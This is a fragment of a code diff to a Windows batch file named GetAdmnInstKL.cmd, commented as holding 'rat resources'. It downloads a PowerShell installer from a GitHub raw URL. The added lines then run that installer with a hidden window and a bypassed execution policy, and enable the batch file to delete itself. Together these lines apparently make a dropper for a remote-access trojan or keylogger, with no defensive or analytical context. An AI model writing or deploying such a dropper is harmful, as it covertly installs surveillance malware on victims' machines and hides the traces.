@@ -40,8 +40,8 @@ REM rat resources
 powershell -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1' -OutFile installer.ps1"
 
 @REM Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File installer.ps1" -WindowStyle Hidden
-powershell -ExecutionPolicy Bypass -File installer.ps1 -windowstyle hidden
+@REM powershell -ExecutionPolicy Bypass -File installer.ps1 -windowstyle hidden
+powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @REM self delete
-@REM del GetAdmnInstKL.cmd'
-pause
+del GetAdmnInstKL.cmd
